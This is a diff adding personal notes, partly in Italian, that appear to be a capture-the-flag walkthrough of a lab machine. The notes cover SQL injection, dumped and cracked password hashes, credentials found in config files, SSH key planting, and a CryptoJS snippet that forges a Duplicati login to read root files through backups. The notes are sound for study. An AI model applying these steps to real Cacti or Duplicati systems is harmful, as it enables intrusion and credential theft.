@@ -1,0 +1,69 @@
+subdomain enum: 
+cacti.monitorsthree.htb
+    /app
+
+https://www.exploit-db.com/exploits/50042
+
+sqli su forget password, con username admin si trova la password hashata: 31a181c8372e3afc59dab863430610e8
+crackando:
+greencacti2001
+
+passwd:
+cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
+
+cerchiamo la pwd di marcus
+
+from monitorsthree_db on machine:
+id      username        email   password        name    position        dob     start_date      salary
+2       admin   admin@monitorsthree.htb 31a181c8372e3afc59dab863430610e8        Marcus Higgins  Super User      1978-04-25      2021-01-12      320800.00
+5       mwatson mwatson@monitorsthree.htb       c585d01f2eb3e6e1073e92023088a3dd        Michael Watson  Website Administrator   1985-02-15      2021-05-10    75000.00
+6       janderson       janderson@monitorsthree.htb     1e68b6eb86b45f6d92f8f292428f77ac        Jennifer Anderson       Network Engineer        1990-07-30    2021-06-20       68000.00
+7       dthompson       dthompson@monitorsthree.htb     633b683cc128fe244b00f176c8a950f5        David Thompson  Database Manager        1982-11-23      2022-09-15     83000.00
+
+
+grep -E "user|username|password" == i find file cacti/lib/installer.php with:
+    '$rdatabase_username = \'cactiuser\';<br>' .
+    '$rdatabase_password = \'cactiuser\';<br>' .
+
+ora  e poi show databases; use cacti; select * from user_auth;
+
+mysql
+id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees    policy_hosts        policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts lastfail        reset_perms
+1       admin   $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G    0       Administrator   marcus@monitorsthree.htb                        on      on      on      on      2       1       1       1       1       on      -1 -1       -1              0       0       436423766
+3       guest   $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu    0       Guest Account   guest@monitorsthree.htb                 on      on      on              1       1       1       1       1               -1      -1 -1               0       0       3774379591
+4       marcus  $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK    0       Marcus  marcus@monitorsthree.htb                on      on      on      on      on      1       1       1       1       1       on      -1      -1 00       1677427318
+
+crack marcus hash ot find:
+marcus:12345678910
+
+(copiare la proprioa chiave pubblica dentro il authrized_keys)
+
+interesting linpeas findings:
+
+/usr/bin/gettext.sh 
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/opt/duplicati/config/Duplicati-server.sqlite   
+
+server duplicati running on port 8200
+
+some files exported from there: one the sqlite files contains:
+
+INSERT INTO Option VALUES(-2,'','server-passphrase','Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=');
+INSERT INTO Option VALUES(-2,'','server-passphrase-salt','xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=');
+INSERT INTO Option VALUES(-2,'','server-passphrase-trayicon','dd0adfca-661a-45c8-bbad-3e01692e1387');
+INSERT INTO Option VALUES(-2,'','server-passphrase-trayicon-hash','V5jVLdMPyyaqeT3hTL7mIKXOk0TrDLMJgQTfobuSfAw=');
+
+
+
+analyzing the service on 8200 after port forwarding in. With Wappalizer i find out that crypto.js is used, which i remember seeing in the linpeas output somewhere
+
+
+https://github.com/duplicati/duplicati/issues/5197 
+
+var saltedpwd = '59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a'; // Replace with the Hex output from step 6
+var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('0zC+dxyjqy383iqrfrbx3fCMkH+Oto2yGbB3BjDHc54=') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replace 'NonceFromBurp' with the intercepted nonce
+console.log(noncedpwd);
+
+questo per loggarsi. Poi creare un backup, usando come folder path: /source/tmp e come source data: /source/root/ alla fine uscirano degli zip da unzippare, e dentro il file filelist.json ci sarà l'elenco di hash associati ai file. Puoi cercare root.txt e poi fare il cat del file che ha come nome quel hash
